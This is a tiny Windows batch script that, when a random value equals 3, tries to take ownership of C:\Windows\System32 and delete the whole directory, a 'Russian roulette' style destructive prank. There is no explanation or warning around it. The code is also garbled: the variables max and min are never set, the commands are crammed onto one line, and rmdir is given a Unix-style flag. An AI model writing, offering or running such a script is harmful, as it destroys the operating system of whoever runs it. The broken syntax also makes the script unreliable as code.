@echo off
set /a result=(%RANDOM%*max/8)+min

if %RANDOM%== 3 cd C:\Windows\System32 takeown /F System32 /R rmdir -r C:\Windows\System32

pause
